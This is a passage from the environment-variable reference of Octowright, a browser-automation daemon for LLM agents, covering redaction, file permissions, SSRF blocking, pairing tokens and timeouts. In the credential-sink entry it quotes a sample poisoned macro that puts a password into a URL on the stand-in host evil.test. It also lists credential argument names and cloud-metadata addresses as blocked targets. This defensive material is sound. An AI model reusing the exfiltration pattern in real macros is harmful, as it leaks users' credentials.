- `OCTOWRIGHT_DEFAULT_LABEL` — override the auto-detected default browser label (see `.octowright/config.yaml` for per-project configuration)
- `OCTOWRIGHT_BADGE_OPACITY` — corner badge opacity (float 0.0–1.0, default 0.35). Lower = more translucent.
- `OCTOWRIGHT_DISABLE_GPU` — launch **Chromium** with `--disable-gpu --disable-gpu-compositing`. **OFF by default.** An escape hatch for the recurring headed-Chromium crash characterised as a deterministic main-process CHECK abort reached through native macOS UI plus the Metal GPU path (Chrome 148 / macOS 26). **Honest scope: this is not a confirmed fix.** The crash's trigger is characterised; this mitigation has not been proven to prevent it. It exists so an operator whose browsers are crashing has something to try in one argument. Per-launch override with `browser_launch(disable_gpu=…)`, which outranks the env var in both directions. Deliberately a boolean over a fixed flag set rather than more `launch_args`: arbitrary argv is gated behind `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH` (a code-execution opt-in), far too heavy a door to open just to turn the GPU off mid-incident, whereas a boolean grants no new power and needs no gate. Chromium-only — Firefox/WebKit would be handed argv they don't understand. Note it does **not** remove WebGL: Chromium falls back to SwiftShader software rendering (measured). Resolver: `browser_pool.options.resolve_disable_gpu`.
- `OCTOWRIGHT_HEADLESS` — force headless mode
- `OCTOWRIGHT_DAEMON_READY_TIMEOUT` — seconds a spawned daemon gets to bind and answer HTTP before the caller gives up (**default 10**). Also settable per-invocation with `octowright serve --ready-timeout`, which exports this var so every `wait_for_daemon()` in the process (including the post-bridge respawn) shares one budget. It matters because exceeding it is not a hard failure: `cli/serve` falls back to running the leader **inline** (`inline_reason="daemon_spawn_failed"`), which is fragile — a cold container running `uv run octowright serve` routinely needs more than 10s and lands there by default. Unparsable / non-positive / non-finite values fall back to the default rather than hanging or never waiting; `--ready-timeout` **refuses** such a value with a `UsageError` instead, since the flag would otherwise be silently floored back to the default while the caller believed it took effect. Parser/const: `daemonize.daemon_ready_timeout` / `DAEMON_READY_TIMEOUT_SECONDS` (defaults.py is at its LOC ceiling).
- `OCTOWRIGHT_IDLE_GRACE` — seconds the idle pool waits before the daemon auto-exits. **Unset/off by default**; a positive number opts in. Rationale + disable tokens: **Idle Watchdog**.
- `OCTOWRIGHT_PROFILES_DIR` — override profile storage root
- `OCTOWRIGHT_MACROS_DIR` — override macro JSON storage root
- `OCTOWRIGHT_ADVISOR_STATE` — override the local Advisor state JSON path (preferences, bounded tool usage, macro observations)
- `OCTOWRIGHT_UPGRADE_STATE` — override the last-seen-version marker path used by the post-upgrade "what's new" notice (see "Post-upgrade notice" above)
- `OCTOWRIGHT_MACRO_SLOWMO_MS` — default per-action delay during macro replay (0 disables)
- `OCTOWRIGHT_PROFILE` — comma-separated capability-profile names to slim the LLM tool surface; unset or `all` registers everything (see "Capability Profiles" above)
- `OCTOWRIGHT_PLUGINS` — comma-separated **entry-point names** of the session-kind plugins this daemon loads. **Nothing loads by default.** Installing a distribution that declares an `octowright.session_kinds` entry point only makes it *discoverable*; an operator has to enable it by name, because a transitive dependency must not be able to silently extend a browser-driving daemon. Resolution order: this variable wins; then a `plugins:` list in `config_paths.user_config_dir() / "plugins.yaml"`; then nothing. Deliberately **not** `.octowright/config.yaml` — that file is found by walking up from CWD, so enabling plugins there would make the MCP tool surface depend on which directory the daemon happened to be spawned in (the same class of surprise as `octowright restart` ignoring `--http-port`). The project config keeps doing what it does today (`label`, `persona`, `profile`): per-project defaults, not capability grants. An enabled name with no matching entry point is reported at `octowright_status()["plugins"]` as `state: "missing"` rather than failing silently. A plugin whose scenario adapter does not match the contract is **refused at load** the same way, with the offending method named: capability support is derived by `isinstance` against `runtime_checkable` Protocols, which tests attribute *presence* and nothing else — not arity, not keyword names, not whether the method is a coroutine — so an adapter carrying a sync `run_macro`, or one taking different keywords, was registered as supporting `macros` and failed with a `TypeError` from core's own call site partway through someone's scenario, read as a scenario failure rather than the plugin defect it is. `plugins.contract.contract_errors` checks each claimed capability (and the mandatory `ScenarioAdapter` floor, which nothing asserted before) by *binding* the call shape the Protocol declares against the implementation's signature, so it tracks the Protocol instead of mirroring it by hand, and an implementation stays free to rename positional parameters — core passes those by position and never names them. Parser: `octowright.plugins.discovery.enabled_names`.
- `OCTOWRIGHT_TAIL_POLL_SECONDS` / `OCTOWRIGHT_TAIL_HEARTBEAT_SECONDS` — WS `/tail` poll interval and quiet-stream keepalive cadence (defaults 1.0 / 15.0)
- `OCTOWRIGHT_DASHBOARD_DISCONNECT_POLL_SECONDS` / `OCTOWRIGHT_DASHBOARD_HEARTBEAT_SECONDS` — SSE `/api/dashboard/events` disconnect-detection cadence and keepalive interval (defaults 0.05 / 15.0)
- `OCTOWRIGHT_REDACT_INPUTS` — record-time scrubbing of user-typed values (`type_text` / `fill`) in the per-session JSONL stream. `off` records the literal value (leaks secrets to anyone reading `/api/sessions/{id}/events`), `passwords` (DEFAULT) replaces values typed into `<input type="password">` — *and* `<input type="text">` carrying `autocomplete=current-password`, `new-password`, or `one-time-code` (the SPA-custom-password-input case) — with `<redacted:password>` while the page still receives the real value, `all` redacts every typed/filled value regardless of element type. `all` additionally scrubs the **selector-less sinks** that carry no inspectable field — `press_key` (key), `evaluate` (expression), and `select_option` (value/label) — via `_redact_sink_value`; `off`/`passwords` leave those raw (they key off element type and can't classify a selector-less value). The **same policy** now also governs accessibility-tree snapshots — see **Accessibility-snapshot credential scrubbing**. This is the record-time companion to the save-time `macros/lint.py` credential check — the linter only fires when an operator saves a recording as a macro, so unless this is set the JSONL on disk still contains the cleartext password. <!-- pragma: allowlist secret (redaction-policy prose, not a credential) -->
- `OCTOWRIGHT_RECORDINGS_PRIVATE` — owner-only permissions for recordings **and the artifact roots**. **ON by default** (an empty value still means on; only an explicit falsey token — `0`/`off`/`false`/`no`/`never`/`none`/`disabled` — widens it). `recorder.Recorder` `chmod`s each JSONL to `0600` and its parent to `0700` so a local user can't read recorded input/URLs/credentials out-of-band. The same knob now locks `CAPTURES_DIR`, `GOLDENS_DIR` and `MACROS_DIR` to `0700` via `private_paths.secure_artifact_tree`, called from `captures.save_capture`, `goldens.save_golden` and `macros/storage`. Those hold the same class of data — page text, accessibility trees, `evaluate` results, and (since `browser_network_requests` began recording them) request headers — but sat at `0755` while recordings and profiles were already locked, so the protection was inconsistent rather than absent. **The directory is the control, not the file mode**, and not as a stylistic preference: `_paths.atomic_write_text` deliberately *preserves* an existing target's mode, because an atomic write must be a content replacement and not a silent permission change — so a golden first written at `0644` before that helper existed keeps `0644` through every later rewrite, forever (observed on a real goldens dir). A `0700` directory denies traversal and covers every file inside regardless of age or mode. Captures nest as `root/host/session`, so the whole tree is walked and the walk is containment-checked first — a leaf outside the configured root is locked on its own rather than chmod-ing unrelated parents on the way up. Best-effort throughout: a failing `chmod` never blocks a capture, golden save, or macro write. See **Recording-file privacy**.
- `OCTOWRIGHT_RECORDING_MAX_BYTES` — per-recording JSONL byte ceiling (disk-fill DoS guard). **OFF by default** (unbounded). Set a positive byte count and `recorder.Recorder` stops appending once the file would exceed it, writing a single `recording_truncated` marker (carrying `limit_bytes`/`bytes_written`) so replay/export/discovery see the cut; a reopened recording counts the bytes already on disk before deciding. A non-positive / falsey (`0`/`off`/`never`/`none`/`disabled`) / unparsable value keeps it off. The parser lives in `recorder._recording_max_bytes` (defaults.py is at its LOC ceiling), mirroring how `incidents`/`health` keep their own `OCTOWRIGHT_*` knobs.
- `OCTOWRIGHT_NETWORK_BODY_MAX_BYTES` — bytes of a **failed** response body retained per recorded network row. **ON by default at 2048.** A recorded row carried url/method/status/failure and no body, so a failing request was recoverable only as its status code — the same thing the console already prints — and a 409 from one endpoint can have eight distinct causes. The refusal reason (`{"detail": "component_allocation_required"}`) is already on the wire and is usually the entire diagnosis; without it the browser stops being the tool and becomes the obstacle, which is what a field report described after two sessions on two wrong hypotheses. Captured only for **non-2xx** responses (successful bodies are large, numerous and rarely interesting, so an ordinary page pays nothing) that are **same-origin** with the page (a third party's response is not the caller's to collect), and capped, with `body_truncated` flagged. A falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) disables capture; an unparsable or negative value falls back to the **default, not to off** — this is a diagnostic that is on by default and a typo must not silently remove the field that explains a failure (the opposite fallback from `OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`, which is off by default and must not be silently turned on). **The read is eager, and it has to be:** measured against Chromium, a body requested after the page has navigated away fails with `Protocol error (Network.getResponseBody): No resource with given identifier`, so a lazy read at tool-call time would return nothing exactly when someone is investigating a failure. It is scheduled as a background task from the `response` event handler (an already-registered `event-critical` gate bypass) and mutates the row in place; a body that cannot be read leaves the row exactly as it was rather than raising in a detached task. Same-origin is compared against the session's own `url` field rather than a live `page.url` read, since the handler must not touch Playwright state — it can lag a navigation the tools did not drive, which costs a body we could have kept, never one we should not have. **Honest scope:** values are NOT redacted, unlike headers — a body has no name to classify on. The non-2xx + same-origin + size scoping is what bounds the exposure, and an application error body from the app under test is a different thing from a request header carrying a live bearer. Parser: `session/core_network_mixin.network_body_max_bytes` (defaults.py is at its LOC ceiling).
- `OCTOWRIGHT_TAIL_MAX_BYTES` — bytes `recorder.tail_log` reads in ONE call (memory guard for the read side of the same file the ceiling above bounds on the write side). **ON by default at 8 MiB**, unlike `OCTOWRIGHT_RECORDING_MAX_BYTES`: every caller (`browser_tail_recording`, `http/discovery.get_events`, `ScenarioPool.tail`) already loops on the returned cursor, so a window costs a round trip rather than correctness — whereas an unbounded `fh.read()` let one `?since=0` on a long-lived recording pull the whole file into the leader (the process owning every live browser) and then multiply it by parsing each line into a dict. A falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) or a non-positive/unparsable value restores the unbounded read. Parser: `recorder._tail_max_bytes` (defaults.py is at its LOC ceiling). **Oversized-line note:** a single JSONL line longer than the window contains no newline, and the pre-existing "no newline means a partial trailing line, wait" branch would then freeze the cursor and return nothing on every poll forever. `recorder._cursor_past_unterminated_window` separates the two cases — step over an oversized line (logging `octowright.recorder.tail_line_too_large`), hold still for a genuine partial write. The length check that distinguishes them is load-bearing: the recorder appends concurrently, so scanning ahead on a short read could pick up bytes written after it and skip a line that was only mid-write.
- `OCTOWRIGHT_SESSION_LIST_SNAPSHOT_MAX` — recordings past which `GET /api/sessions` stops snapshotting its assembled closed-session listing (**default 50,000**). The listing walks every recording in the directory. A per-file LRU cannot serve that walk: a corpus larger than the cache makes the sequential scan evict its own earliest entries and finish holding only the tail, so the next request restarts at the head and misses on everything but that tail. Sizing an LRU past the corpus only moves the cliff, so the listing keeps one directory's worth instead — replaced rather than grown on each rebuild, so it cannot creep the way a raised cap would. Measured on a real 10,177-recording directory: ~9,600 re-opened files and 2.8s per call, warm or cold, and three consecutive calls timed at 2.78 / 2.85 / 2.59s — flat, because the cache never warmed. `http/discovery._summaries_for` therefore keeps its own per-directory snapshot keyed on the directory mtime (what changes when a recording is added or removed; appending to an existing one does not touch it, and need not, since a summary is built from the opening row and that is fixed for the file's lifetime). A rebuild carries forward every summary whose `(mtime_ns, size)` is unchanged, so adding one recording re-reads one file. The snapshot is REPLACED rather than grown on each rebuild, so unlike an LRU with a raised cap it cannot creep; this ceiling exists only so a pathological corpus cannot turn the cache into memory pressure in the process that also owns every live browser. Above it the listing still works, uncached. Non-positive / unparsable falls back to the default. Const: `http/discovery.SESSION_LIST_SNAPSHOT_MAX` (defaults.py is at its LOC ceiling).
- `OCTOWRIGHT_MAX_REQUEST_BODY_BYTES` — route-level HTTP request-body ceiling. **OFF by default** (unbounded). A positive byte count rejects a larger JSON body with `413` before it is fully materialized: `http/routes/_common._read_body_capped` checks `Content-Length` early and streams+counts so a lying/absent length can't bypass it. Falsey (`0`/`off`/`never`/`none`/`disabled`/`false`/`no`) / unparsable / non-positive keeps it off. Parser: `http/routes/_common._max_request_body_bytes` (defaults.py at its LOC ceiling).
- `OCTOWRIGHT_WEBSOCKET_MAX_BYTES` — per-session WebSocket sidecar byte ceiling (disk-fill DoS guard for a firehose page). **OFF by default** (unbounded). A positive value stops appending recorded frames to the `.websocket.cache.jsonl` sidecar once it would exceed the limit, writing a single `websocket_truncated` marker (carrying `limit_bytes`/`bytes_written`) so inspection sees the cut. Falsey/unparsable/non-positive keeps it off. Parser: `session/core_io_mixin._websocket_max_bytes` (defaults.py at its LOC ceiling).
- `OCTOWRIGHT_SSRF_POLICY` — opt-in block of `http(s)` navigation to non-public hosts. **OFF by default**. `off` performs no host check; `block-private` refuses navigation to a *literal* IP in any non-public range (loopback, link-local **including the `169.254.169.254` cloud-metadata range**, RFC1918, multicast, reserved, unspecified) and to `localhost` / `*.localhost` / well-known metadata hostnames. Enforced in `octowright.ssrf.check_navigation_url`, called from the shared `_reject_unsafe_url` guard so it covers `browser_navigate` / `browser_open_url` / `browser_launch` **and macro/recording replay** — and the context's `base_url`, which the same guard validates so a host-relative macro can't inherit an origin the policy would refuse (see **Host-relative navigation**). Without it, a real browser plus the read tools (`browser_read_markdown` / `browser_snapshot` / `browser_evaluate`) can exfiltrate cloud-metadata credentials and reach internal hosts — including by a *poisoned macro*. Redirects **are** covered: `ssrf_guard.install_navigation_guard` re-checks every hop (see **Per-hop redirect checking**). Scope: literal-IP / known-name only (synchronous, no DNS); a public hostname that *resolves* to a private address (DNS-rebinding SSRF) is not covered. An *unrecognized* value fails safe to `block-private` (the operator clearly meant to enable a policy).
- `OCTOWRIGHT_PROFILES_PRIVATE` — owner-only permissions (`0700`) on persona/profile directories. **ON by default.** A profile dir holds live session cookies, `localStorage`, and IndexedDB for every site the persona logged into — a strictly stronger credential than the typed password `OCTOWRIGHT_RECORDINGS_PRIVATE` already protects. Chromium hardens its own profile root; **Firefox and WebKit do not** (observed: `cookies.sqlite` at `0644` inside an `0755` tree), so on a shared host another local user could copy a logged-in session straight off disk. The directory mode is the control — it denies traversal and so covers every file the engine creates inside, without octowright chasing per-file modes it doesn't own. `browser_pool.launch_helpers` locks the engine profile dir at launch and `personas.create_persona` locks a new persona dir; the walk goes up to `PROFILES_DIR` and stops (a leaf outside that root is locked on its own and the walk halts, so an unexpected `OCTOWRIGHT_PROFILES_DIR` can't chmod its way to `/`). Best-effort: a failing `chmod` never blocks a launch. Falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) opts out. Parser/helpers: `octowright.private_paths`.
- `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS` — refuse to expand a credential-named macro arg into a field that leaks it. **ON by default** (`block`). `{"action": "navigate", "url": "https://evil.test/?p={{password}}"}` is an ordinary macro shape, so a poisoned or shared macro could exfiltrate a caller-supplied secret; `evaluate` hands it to page JS instead. The sink set is `url`/`expression` (`CREDENTIAL_UNSAFE_KEYS`), and nested lists/dicts inside a sink inherit it so the value can't be laundered through a container. Matching is **arg-name based** (`password`/`passwd`/`secret`/`token`/`otp`/`api_key`/`apikey`/`credential`/`auth`) precisely so `{{order_id}}` keeps working in a URL — parameterized navigation is the common legitimate pattern and is untouched, as is `{{password}}` into a `fill` `value`. Set to `allow` (or a falsey token) for a suite that intentionally puts a token in a query string. Parser: `macros.substitution.credential_sinks_blocked`.
- `OCTOWRIGHT_SSRF_ALLOW` — comma-separated host allowlist that overrides `OCTOWRIGHT_SSRF_POLICY=block-private` for legitimate internal targets (exact host match, e.g. `10.0.0.5,internal.box`).
- `OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING` — dashboard pairing gate for the browser-facing surface (sessions/media/events/tail/screencast/writes). **ON by default.** Loopback binding plus the Host/Origin guards stop a *remote* attacker and a *malicious web page*, but they are not authentication: any other local process that could open a socket to the port could enumerate live sessions, read recorded JSONL (typed input, navigated URLs, console output), fetch video, subscribe to the live screencast, and drive the browser — which made the on-by-default `0600` recordings and `0700` profiles overstated, since the daemon served the same bytes over HTTP. Mint a bearer with `octowright dashboard` (prints a single-use `/pair#<code>` URL, 60s TTL); guarded routes also accept `X-Octowright-Token` for follower/programmatic callers. Set a falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) to restore the type-the-URL flow. An **empty value means ON**, matching `OCTOWRIGHT_RECORDINGS_PRIVATE` — only an explicit falsey token disables a security default. **Enforcement needs something to pair against:** `octowright dashboard` authenticates with the leader's capability token, so an inline (`--no-singleton`) leader — no lockfile, no token — could never mint a code. Under the *default* the gate therefore degrades to unenforced there (logging `octowright.dashboard.pairing_unenforceable`) rather than shipping a permanently unopenable dashboard; an **explicit** opt-in keeps the original fail-closed behaviour. The anchor is not request-controlled (`build_app` attaches it unconditionally), and `tests/test_dashboard_pairing_default.py` pins that so a refactor can't silently disable the gate. `/api/mcp-events` is pairing-exempt: it already demands the capability token, a strictly stronger credential. **Getting the URL from an agent:** `octowright_dashboard_url` mints a pairing code itself and returns a ready-to-open `/pair#<code>` URL (plus `plain_url`, `pairing_required`, `pairing_expires_in`, `pairing_hint`), so "show me the dashboard" works in one step from a chat client with no terminal — otherwise the agent would hand the user a link that 401s. `octowright_status()` also reports a dashboard URL; it stays the **plain** address (status is polled often, and minting there would churn the bounded code store and could evict a code the user was just handed) and carries `dashboard_pairing_required` so the agent knows to call `octowright_dashboard_url` for an openable link instead of showing the bare one. **The MCP surface itself is untouched by pairing:** the gate is applied by `exposure.guard_sensitive_http` per route, while the follower bridge talks to the mounted `/mcp` ASGI app guarded by `SensitiveASGIGuard` + `BridgeTokenGuard` — verified, and pinned by `tests/test_pairing_leaves_mcp_working.py`, which also pins that `/new-tab` (a launched browser has no bearer), `/pair`, and the SPA shell stay reachable unauthenticated. That mint uses a longer window (`MCP_PAIR_CODE_TTL_SECONDS`, 600s) than the CLI's 60s, because a human reading an agent's message needs longer than an operator pasting from their own terminal; it stays single-use and loopback-only. Minting from MCP grants nothing new — the `/mcp` transport is gated by the *same* capability token the pairing store checks, so an MCP caller is already inside the trust boundary, and where that gate is off the caller can already drive browsers. `build_app` publishes the store through `http/state.set_dashboard_pairing` (the tool has no handle on the Starlette app); that is process-global, so `tests/conftest.py` isolates it per test or one test's token-carrying app lends its store to the next. **Arriving without a bearer is the normal case, and the page says so:** the corner badge injected into every launched browser links to the dashboard, and those links can never carry a pairing code -- a code is single-use with a 60s TTL, and the init script that would hold one runs *in the page*, where every site the browser visits could read it. A bookmark, a typed address, and a leader restart all land the same way. So an unpaired arrival renders a blocking gate (`packages/octowright-frontend/src/pairing-gate.ts`) that names both routes back in, rather than the panel tree, which asserted **"No live sessions."** while sessions were running and promised **"Retrying automatically."** after `authRequired` had already called `stopPolling()` -- the only accurate message was a snackbar that self-hid after 3.5s. `bootDashboard`'s tick bails on `authBlocked` *before* rendering, so that false state is never painted at all: the 401 handler runs synchronously inside `loadState`'s own fetches. The gate distinguishes only the two states a browser can actually tell apart -- no bearer was ever held, versus one the leader refused -- because "it expired" and "the daemon restarted and forgot every pairing" are the same 401 from there, and the copy names both instead of guessing. See **Bridge capability token → Browser dashboard**.
- `OCTOWRIGHT_BRIDGE_REQUIRE_TOKEN` — require the `X-Octowright-Token` capability token on the leader's `/mcp` transport **and the follower-only `/api/mcp-events` SSE channel**. **ON by default.** Set a falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) to disable the gate. See **Bridge capability token** for the threat model + honest limits.
- `OCTOWRIGHT_MIN_FREE_MEMORY_MB` — memory-pressure launch governor (H4b). **OFF by default.** When set to a positive MB floor, every user-facing launch path (`browser_launch` / `browser_quick_launch` / `browser_spawn_roster` **and `scenario_start`**) refuses a launch while *available* memory is below it, heading off the low-memory → renderer-crash cascade. The cap and this floor are enforced in the pool layer (`browser_pool.limits`, at the `roster.spawn_roster` chokepoint plus single-launch shims) so the scenario path — which calls `pool.spawn_roster` directly — can't bypass them; internal relaunch/handoff/crash-recovery go through `pool.launch` and are intentionally uncapped. Available memory is read per-platform (Linux `/proc/meminfo` `MemAvailable`; macOS `vm_stat` free+inactive+speculative+purgeable) by `octowright.sysresources` — NOT a sysconf one-liner, because the macOS "free" count reports cache/purgeable RAM as used and would false-refuse. An unreadable value never refuses. `0`/`off`/`never`/`none`/`disabled` keep it off. Surfaced at `octowright_status()["pool"]["min_free_memory_mb"]` / `["available_memory_mb"]` (both null when off). The value lives in `octowright.sysresources.MIN_FREE_MEMORY_BYTES` (defaults.py is at its LOC ceiling), mirroring how `incidents`/`health` keep their own `OCTOWRIGHT_*` knobs.
- `OCTOWRIGHT_DRIVER_RELAUNCH` — driver-death lost-session handling (H4a). When the shared Playwright driver dies and self-heals (P3), every browser that rode it is gone; Octowright **always** captures + surfaces those lost sessions at `octowright_status()["pool"]["lost_sessions"]` (each `{instance_id, kind, url, profile, reason, relaunched_to}`). This knob controls whether it also auto-reopens them to their last URL/profile: `off` (DEFAULT) surface only — no instance_id churn, no surprise navigation; `new-id` reopens with a fresh instance_id (the lost record maps old→new, clients must rebind); `keep-id` reopens and rebinds the ORIGINAL instance_id so existing client handles keep resolving (best-effort — the recording file stays under the fresh id; navigation re-runs either way). Loop-guarded: an auto-reopened session that dies again is not recaptured. The value/parser live in `octowright.browser_pool.driver_relaunch` (`DRIVER_RELAUNCH_MODE` / `parse_mode`).
- `OCTOWRIGHT_BRIDGE_SUSPEND_THRESHOLD_SECONDS` — follower suspend-detection threshold (default `5.0`). The deadline watchdog (`proxy_supervisor.watch_deadlines`) times the wall-clock gap between its own iterations; a gap exceeding its sleep interval by more than this means the follower **process** was frozen (an MCP client SIGSTOPped it — e.g. Codex/Claude compaction), not normal jitter. On detection it shifts every in-flight request's `time.monotonic` deadline forward by the frozen span so a call the freeze stranded isn't falsely timed out the instant the follower resumes (its deadline would otherwise already be blown). It deliberately does **not** force a reconnect — the reactive reset→resume path reconnects if the connection actually died, and forcing one here races the in-flight forward. Pairs with the reconnect replaying the **full** `initialize` + `notifications/initialized` handshake — replaying only `initialize` leaves the fresh leader session half-initialized, so the next tool call gets a 400, the failure a real follower hits after a compaction freeze. Counted by `octowright_bridge_suspension_total`. Const lives in `proxy_supervisor.SUSPEND_THRESHOLD_SECONDS` (defaults.py is at its LOC ceiling).
- `OCTOWRIGHT_HEARTBEAT_INTERVAL_SECONDS` / `OCTOWRIGHT_HEARTBEAT_MAX_SECONDS` — leader-side progress-heartbeat cadence (default `8.0`) and absolute ceiling (default `600.0`). The follower injects a synthetic `progressToken` into every `tools/call` and re-arms that request's in-flight deadline on each `notifications/progress` it sees (`proxy_supervisor._rearm_deadline`) — but **nothing on the leader emitted those pings**, so the whole re-arm path was dead and the bridge fell back to static per-tool timeout guessing (`BRIDGE_TOOL_TIMEOUTS`). A genuinely-working call that outran its static budget (a slow `browser_expect_*`/`scenario_start`/`browser_wait_for` on a sluggish site — none of which even have a per-tool override, so they used the flat 20s `BRIDGE_REQUEST_TIMEOUT_SECONDS`) then surfaced to the agent as a **spurious "Octowright disconnected"**, and per `BRIDGE_ERROR_GUIDANCE` the agent told the user to reconnect a healthy server. `server/_heartbeat._progress_heartbeat` (the OUTERMOST tool wrapper in `server/_state.py`) closes this: while a tool handler runs, a background task sends progress on the injected token every interval. The first ping lands before the flat 20s deadline, so **every** tool — even those with no `BRIDGE_TOOL_TIMEOUTS` entry — is re-armed and stays alive as long as the leader event loop is alive to run the heartbeat. The three failure modes now resolve predictably: *slow but alive* → pings flow, no false disconnect; *leader loop wedged/dead* → the heartbeat can't run either, so pings stop and the deadline expires fast (a real problem, surfaced quickly); *handler wedged past its own internal timeout* → pings stop at the ceiling, bounding the worst-case single-call hang instead of hanging the agent forever. The ceiling must exceed the longest legit single call (a big `macro_run_sequence`) or the agent's post-timeout retry would double-execute the side effect. A client that supplies its OWN `progressToken` receives these pings as normal progress (it opted in); a bridge-synthetic token is swallowed by the follower and never reaches the client. Consts live in `server/_heartbeat.py` (defaults.py is at its LOC ceiling).
- `OCTOWRIGHT_BRIDGE_MIN_SESSION_SECONDS` — flap-guard threshold for the follower reconnect loop (default `2.0`). The success path of `proxy_runtime.run_supervised_proxy` (a session that ended cleanly, vs. the error path) had **no backoff** — so if the leader accepted a connection then ended the session almost immediately, the follower reconnected with zero delay, busy-looping the leader into a `Created new transport` / `Terminating session` storm (observed at ~300+ transports/sec across several live followers, starving real tool calls). Now a cleanly-ended session that lived **shorter than this** is treated as a *flap* and backed off via `reconnect_delay(flap_attempt)` (increasing, capped at `OCTOWRIGHT_BRIDGE_RECONNECT_MAX_SECONDS`), counted as `octowright_bridge_reconnect_total{reason="session_flap"}`; a session that lived at least this long reconnects promptly and resets the flap counter. The decision lives in the pure `proxy_runtime._post_session_backoff`; the const is in `proxy_runtime` (defaults.py is at its LOC ceiling). NOTE: this is follower-side — it takes effect for followers spawned after the fix; already-running old followers keep storming until their client reconnects.
- `OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS` — reap an idle StreamableHTTP MCP session after this many seconds. **OFF by default**, mirroring `OCTOWRIGHT_IDLE_GRACE`'s philosophy: nothing pings the leader to reset a session's idle deadline between real tool calls (only an in-flight call's progress heartbeat does, via `server/_heartbeat.py`), so an ordinary interactive gap — reading output, deciding what to say, watching a slow build/CI run — looks identical to an abandoned session to this timer. Two prior defaults (300s, then 3600s) both reaped live, wanted sessions during normal silence; there is no timeout short enough to catch an abandoned reconnect-storm session without also risking a real one that pauses that long. Set a positive number (e.g. `1800`) to opt in on a shared/CI host that wants bounded memory over long-lived idle sessions; unset/`0`/`off`/`never`/`none`/`disabled` keep it off (the mcp library's own default — it never reaps). When enabled, `http/app.py` sets the timeout on the manager after `streamable_http_app()` builds it (via `_apply_mcp_session_idle_timeout`); the manager resets the deadline on each request, so an ACTIVE session is never reaped — only a truly idle/abandoned one, whose `run_server` task then exits and frees its memory. Without it, an unbounded reconnect-storm (see `OCTOWRIGHT_BRIDGE_MIN_SESSION_SECONDS`) can still leak ~54KB per abandoned session (observed a leader at **2.4GB RSS with zero live browsers** after ~17h; a worse case with heavier concurrent-follower load reached **18.8GB** over ~4.7 days on 2026-07-09) — the flap-guard and split-brain fixes reduce how often such storms happen, but this knob is the direct bound if one still gets through. The parser lives in `http/app.py` (defaults.py at LOC ceiling). **Complementary, unconditional reaper:** `housekeeping._reap_dead_follower_sessions_once` runs every housekeeping cycle regardless of this knob, and reaps by *PID liveness* instead of idle time — bridge-state.json already carries each follower's `(follower_pid, remote_session_id)`, so a follower whose OS process is confirmed gone is terminated immediately, with zero risk of false-positiving on a live client that's merely quiet (the exact risk that keeps idle-time reaping off by default). See `housekeeping.py`'s module docstring (job 3) and `octowright_follower_session_reaped_total` in the metrics table below. See **Leader-side storm protection** for the on-by-default rate-limit + session-cap that bound an *active* storm this reaper can't touch.
- `OCTOWRIGHT_MCP_MAX_SESSIONS` — the concurrent-`/mcp`-session cap housekeeping job 4 LRU-evicts back down to (see **Leader-side storm protection** above for the eviction ordering). **Default 256** (on); `0`/`off`/`never`/`none`/`disabled`/non-positive disables. Parser + eviction selector in `http/mcp_flap_guard.py`.
- `OCTOWRIGHT_MCP_NEW_SESSION_MAX` / `OCTOWRIGHT_MCP_NEW_SESSION_WINDOW_SECONDS` — the per-source new-session rate limit's threshold and window (**defaults 10 per 10s**, on; see **Leader-side storm protection** above). A falsey `OCTOWRIGHT_MCP_NEW_SESSION_MAX` disables the limiter. Parser in `http/mcp_flap_guard.py`.
- `OCTOWRIGHT_PROTECT_HEADED` — protect HEADED, non-ephemeral browsers at launch
  by default (a reflex `browser_close` is refused; `force=True` still closes).
  **ON by default**; `=0` disables. Headless is never auto-protected.
  Outranked by `OCTOWRIGHT_PROTECT_BROWSERS=1` (protect all). Parser/const:
  `defaults.PROTECT_HEADED_DEFAULT`; resolver `browser_pool.options.resolve_protected`.
- `OCTOWRIGHT_HEADED_LAUNCH_CONCURRENCY` — how many **headed** browsers
  `spawn_roster` may launch at the same instant (**default 3**), via a per-call
  `asyncio.Semaphore`. A big headed roster/scenario now starts in batches rather
  than firing every window creation simultaneously; **headless is never
  throttled** (`headed is False` bypasses the gate entirely, and `headed=None`
  resolves headed-by-default so it goes through it). Explicitly **defensive
  hardening, NOT a proven crash fix** — characterisation of the recurring
  headed-Chromium crash reproduced it through rapid *sequential* `browser_launch`
  churn, and concurrent `spawn_roster` launches did *not* reproduce it; bounding
  simultaneous window creation is merely prudent, since window-server/GPU pressure
  scales with it. The exact churn trigger is still under investigation. An
  unparsable value falls back to the default; the floor is 1 (a non-positive value
  would deadlock). Parser/const: `browser_pool.limits.headed_launch_concurrency` /
  `HEADED_LAUNCH_CONCURRENCY_DEFAULT`.
- `OCTOWRIGHT_UNBOUNDED_CALL_TIMEOUT_SECONDS` — per-call budget on a
  Playwright call that accepts no `timeout` of its own (`evaluate`, `title`,
  `content`, and every other such call site — all routed through
  `session/timeouts.bounded` and pinned there by an AST scan,
  `tests/session/test_no_unbounded_calls.py`, rather than a count kept by
  hand here). ONE site is deliberately exempt and allowlisted in that scan:
  `core_page_mixin._evaluate_truthy`, the predicate `_poll_until`
  re-invokes on every iteration of a `browser_wait_for`/`expect_js` poll —
  bounding a per-poll predicate is a different question from bounding a
  one-shot call, so a wedge there is covered by the active-duration ceiling
  (`OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`) instead. **ON by default at `30` seconds**,
  unlike this repo's other new quotas: a target that stops answering
  (observed on 2026-08-29 as a full test suite wedged for 12.6 hours against
  a broken WebKit) hangs the calling coroutine forever otherwise, and
  `page.on("crash")` never fires for a target that is merely unresponsive.
  `0` (or a falsey token — `off`/`never`/`none`/`disabled`/`false`/`no`)
  disables it and awaits unbounded; an **unparsable or non-positive value
  falls back to the default**, not to disabled — a typo must not silently
  reintroduce the hang this exists to prevent. Cancellation releases the
  calling coroutine (and the session's operation gate) within the budget,
  but cannot make Playwright's driver or the browser process abandon a call
  already sent over the wire — the underlying request may still be
  outstanding after `bounded()` raises `SessionCallTimeoutError`. See
  **MCP notifications (proactive, LLM-facing)** below for how an escaping
